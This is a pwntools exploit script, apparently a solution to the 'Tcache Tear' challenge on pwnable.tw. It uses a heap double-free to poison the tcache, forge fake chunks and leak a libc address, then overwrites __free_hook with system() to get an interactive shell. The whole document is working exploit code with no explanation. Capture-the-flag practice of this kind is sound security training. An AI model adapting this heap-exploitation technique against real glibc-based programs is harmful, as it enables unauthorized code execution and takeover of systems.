#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./tcache_tear_patched')
libc = ELF('./libc.so')
ld = ELF('./ld-2.27.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10207)

def add(sz, data):
    sa('Your choice :', '1')
    sa('Size:', str(sz))
    sa('Data:', data)

def delete():
    sa('Your choice :', '2')

def show():
    sa('Your choice :', '3')

fake_chunk = 0x0000000000602060 + 0x10

# crete fake chunk to leak libc
sa('Name:', up64(0) + up64(0x501)) # fake chunk 1 start
add(0x8, 'A' * 8)
delete() # 1
delete() # 2
add(0x8, up64(fake_chunk)) # write tcache bin fd pointer
add(0x8, 'A' * 8)
payload = (
    'A' * 0x18 + up64(fake_chunk) + # keep pointer unchanged
    'A' * (0x500 - 0x30) + # fake chunk 1 data
    up64(0x500) + up64(0x21) + 'B' * 0x10 + # fake chunk 2
    up64(0x20) + up64(0x21) + 'C' * 0x10 # fake chunk 3
)
#gdb.attach(p, 'b *0x0000000000400B84\nc')
add(0x8, payload)
delete() # 3 # put into unsorted bin
show()
ru('Name :')
libc_base = uu64(r(0x20)[-8:]) - 0x3ebca0
info('libc_base = ' + hex(libc_base))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))
free_hook = libc_base + libc.sym['__free_hook']
info('free_hook = ' + hex(free_hook))

# overwrite __free_hook to get shell
add(0x28, 'D' * 8)
delete() # 4
delete() # 5
add(0x28, up64(free_hook))
add(0x28, 'D' * 8)
add(0x28, up64(system))
add(0x28, '/bin/sh\x00')
delete()

#gdb.attach(p)

p.interactive()

